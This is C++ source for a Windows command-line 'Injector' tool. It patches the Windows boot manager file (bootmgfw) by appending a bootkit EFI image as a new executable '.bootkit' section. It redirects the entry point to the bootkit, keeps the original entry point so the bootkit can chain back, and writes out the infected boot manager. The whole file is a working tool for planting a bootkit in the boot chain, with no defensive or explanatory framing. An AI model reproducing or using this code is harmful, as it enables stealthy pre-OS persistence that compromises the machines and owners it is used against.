#include <Windows.h>
#include <vector>
#include <fstream>
#include <cstdint>
#include <cstdlib>

static std::vector<uint8_t> ReadAllBytes(const char* FileName)
{
    auto hFile = CreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return {};
    }
    std::vector<uint8_t> data;
    auto FileSize = GetFileSize(hFile, nullptr);
    data.resize(FileSize);
    DWORD BytesRead = 0;
    if (!ReadFile(hFile, data.data(), FileSize, &BytesRead, nullptr))
    {
        data.clear();
    }
    CloseHandle(hFile);
    return data;
}

static bool WriteAllBytes(const char* FileName, const std::vector<uint8_t>& Data)
{
    auto hFile = CreateFileA(FileName, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    DWORD BytesWritten = 0;
    auto success = !!WriteFile(hFile, Data.data(), (DWORD)Data.size(), &BytesWritten, nullptr);
    CloseHandle(hFile);
    return success;
}

static PIMAGE_NT_HEADERS GetNtHeaders(void* ImageData)
{
    auto DosHeader = PIMAGE_DOS_HEADER(ImageData);
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return nullptr;
    }
    auto NtHeaders = PIMAGE_NT_HEADERS((char*)ImageData + DosHeader->e_lfanew);
    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE || NtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
    {
        return nullptr;
    }
    return NtHeaders;
}

static DWORD AlignSize(DWORD Size, DWORD Alignment)
{
    // TODO: this is fugly
    if (Size % Alignment)
        Size = ((Size + Alignment) / Alignment) * Alignment;
    return Size;
}

static bool AppendBootkit(std::vector<uint8_t>& BootmgfwData, std::vector<uint8_t>& BootkitData)
{
    auto BootmgfwHeaders = GetNtHeaders(BootmgfwData.data());
    if (BootmgfwHeaders == nullptr)
    {
        puts("[Injector] Invalid PE file (bootmgfw)");
        return false;
    }

    auto BootkitHeaders = GetNtHeaders(BootkitData.data());
    if (BootkitHeaders == nullptr)
    {
        puts("[Injector] Invalid PE file (bootkit)");
        return false;
    }

    auto SectionAlignment = BootkitHeaders->OptionalHeader.SectionAlignment;
    auto FileAlignment = BootkitHeaders->OptionalHeader.FileAlignment;
    if (SectionAlignment != 0x1000 || FileAlignment != 0x1000)
    {
        puts("[Injector] Bootkit not compiled with /FILEALIGN:0x1000 /ALIGN:0x1000");
        return false;
    }

    // Put the original entry point in the bootkit headers
    auto BootkitEntryPoint = BootkitHeaders->OptionalHeader.AddressOfEntryPoint;
    BootkitHeaders->OptionalHeader.AddressOfEntryPoint = BootmgfwHeaders->OptionalHeader.AddressOfEntryPoint;

    std::vector<uint8_t> SectionData;
    auto AlignmentSize = 0x1000;
    SectionData.resize(AlignmentSize, 0xCC);
    BootkitData.resize(AlignSize((DWORD)BootkitData.size(), FileAlignment));
    SectionData.insert(SectionData.end(), BootkitData.begin(), BootkitData.end());

    // Create the new section
    auto Sections = IMAGE_FIRST_SECTION(BootmgfwHeaders);
    auto NumberOfSections = BootmgfwHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER NewSection = {};
    memcpy(NewSection.Name, ".bootkit", 8);
    NewSection.SizeOfRawData = (DWORD)SectionData.size();
    NewSection.PointerToRawData = (DWORD)BootmgfwData.size();
    NewSection.Misc.VirtualSize = AlignSize((DWORD)SectionData.size(), SectionAlignment);
    NewSection.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
    NewSection.VirtualAddress = Sections[NumberOfSections - 1].VirtualAddress + AlignSize(Sections[NumberOfSections - 1].Misc.VirtualSize, BootmgfwHeaders->OptionalHeader.SectionAlignment);

    // Check the static base is correct
    auto BootkitBase = NewSection.VirtualAddress + AlignmentSize;
    if (BootkitBase != BootkitHeaders->OptionalHeader.ImageBase)
    {
        printf("[Injector] Invalid bootkit base (0x%llx), expected /BASE:0x%x\n", BootkitHeaders->OptionalHeader.ImageBase, BootkitBase);
        return false;
    }

    // Adjust the headers
    BootmgfwHeaders->OptionalHeader.AddressOfEntryPoint = BootkitBase + BootkitEntryPoint;
    BootmgfwHeaders->OptionalHeader.SizeOfImage += NewSection.Misc.VirtualSize;
    BootmgfwHeaders->FileHeader.NumberOfSections++;
    Sections[NumberOfSections] = NewSection;

    // Append the section data to the file
    BootmgfwData.insert(BootmgfwData.end(), SectionData.begin(), SectionData.end());

    // TODO: fix up the checksum?

    return true;
}

int main(int argc, char** argv)
{
    if (argc < 4)
    {
        puts("Usage: Injector bootmgfw.original bootkit.efi bootmgfw.injected");
        return EXIT_FAILURE;
    }
    auto BootmgfwOriginal = argv[1];
    auto Bootkit = argv[2];
    auto BootmgfwInjected = argv[3];
    auto BootmgfwData = ReadAllBytes(BootmgfwOriginal);
    if (BootmgfwData.empty())
    {
        printf("[Injector] Failed to read '%s'\n", BootmgfwOriginal);
        return EXIT_FAILURE;
    }
    auto BootkitData = ReadAllBytes(Bootkit);
    if (BootkitData.empty())
    {
        printf("[Injector] Failed to read '%s'\n", Bootkit);
        return EXIT_FAILURE;
    }
    if (!AppendBootkit(BootmgfwData, BootkitData))
    {
        puts("[Injector] Failed to inject .bootkit section");
        return EXIT_FAILURE;
    }
    if (!WriteAllBytes(BootmgfwInjected, BootmgfwData))
    {
        printf("[Injector] Failed to write '%s'\n", BootmgfwInjected);
        return EXIT_FAILURE;
    }
    puts("[Injector] Bootkit injected!");
    return EXIT_SUCCESS;
}